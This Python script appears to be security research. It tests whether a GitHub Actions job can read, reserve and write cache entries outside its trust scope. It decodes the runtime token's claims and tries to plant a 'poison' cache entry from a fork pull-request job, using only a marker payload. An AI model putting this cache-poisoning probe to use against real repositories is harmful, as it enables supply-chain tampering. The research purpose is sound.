#!/usr/bin/env python3
"""Print the cache-scope claim a job actually holds and test what the cache
service lets that job read and write. Run in both a trusted push job and an
untrusted fork pull_request job of the same repository."""
import base64
import json
import os
import re
import sys
import urllib.error
import urllib.request

role = sys.argv[1] if len(sys.argv) > 1 else '?'
env = json.load(open(os.environ['RUNNER_TEMP'] + '/runtime_env.json'))
TOKEN = env['ACTIONS_RUNTIME_TOKEN']
RESULTS = env['ACTIONS_RESULTS_URL'].rstrip('/')
CACHE = RESULTS + '/twirp/github.actions.results.api.v1.CacheService/'
# sha256("trusted-data|zstd-without-long|1.0")
import hashlib
VERSION = hashlib.sha256(b'trusted-data|zstd-without-long|1.0').hexdigest()
SECRET_RE = re.compile(r'(sig=|skoid=|sktid=)[^&"\s]*')


def claims(tok):
    p = tok.split('.')[1]
    p += '=' * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))


C = claims(TOKEN)
print('ROLE            %s' % role)
print('GITHUB_REF      %s' % os.environ.get('GITHUB_REF'))
print('GITHUB_EVENT    %s' % os.environ.get('GITHUB_EVENT_NAME'))
print('GITHUB_REPO     %s' % os.environ.get('GITHUB_REPOSITORY'))
for k in ('ac', 'acsl', 'repository_id', 'repository_visibility', 'trust_tier',
          'run_type', 'oidc_sub', 'plan_id', 'job_id'):
    print('CLAIM %-22s %s' % (k, C.get(k)))
print('CACHE VERSION   %s' % VERSION)
print('ACTIONS_CACHE_MODE %r' % env.get('ACTIONS_CACHE_MODE'))


def post(path, body):
    req = urllib.request.Request(CACHE + path, data=json.dumps(body).encode(), headers={
        'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json',
        'User-Agent': 'actions-authz-research/1.0'})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:  # noqa
        return -1, repr(e)


def show(label, st, txt):
    print('%-40s -> %s %s' % (label, st, SECRET_RE.sub(r'\1<RED>', txt)[:420]))


st, txt = post('GetCacheEntryDownloadURL',
               {'key': 'trusted-cache-key', 'restore_keys': [], 'version': VERSION})
show('read trusted-cache-key', st, txt)
if '"ok":true' in txt:
    try:
        u = json.loads(txt)['signed_download_url']
        with urllib.request.urlopen(u, timeout=25) as r:
            blob = r.read()
        print('    fetched %d bytes, head=%r' % (len(blob), blob[:80]))
    except Exception as e:  # noqa
        print('    fetch failed %r' % e)

st, txt = post('CreateCacheEntry',
               {'key': 'trusted-cache-key', 'version': VERSION})
show('WRITE reserve trusted-cache-key', st, txt)

st, txt = post('CreateCacheEntry',
               {'key': 'poison-from-%s' % role, 'version': VERSION})
show('WRITE reserve poison key', st, txt)
if '"ok":true' in txt:
    up = json.loads(txt)['signed_upload_url']
    payload = ('POISON_WRITTEN_BY_%s\n' % role).encode()
    req = urllib.request.Request(up, data=payload, method='PUT', headers={
        'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/octet-stream'})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            print('    blob PUT %s' % r.status)
    except Exception as e:  # noqa
        print('    blob PUT failed %r' % e)
    st, txt = post('FinalizeCacheEntryUpload',
                   {'key': 'poison-from-%s' % role, 'version': VERSION,
                    'size_bytes': str(len(payload))})
    show('    finalize poison key', st, txt)

for k in ('poison-from-untrusted', 'poison-from-trusted'):
    st, txt = post('GetCacheEntryDownloadURL',
                   {'key': k, 'restore_keys': [], 'version': VERSION})
    show('read %s' % k, st, txt)

print('DONE')
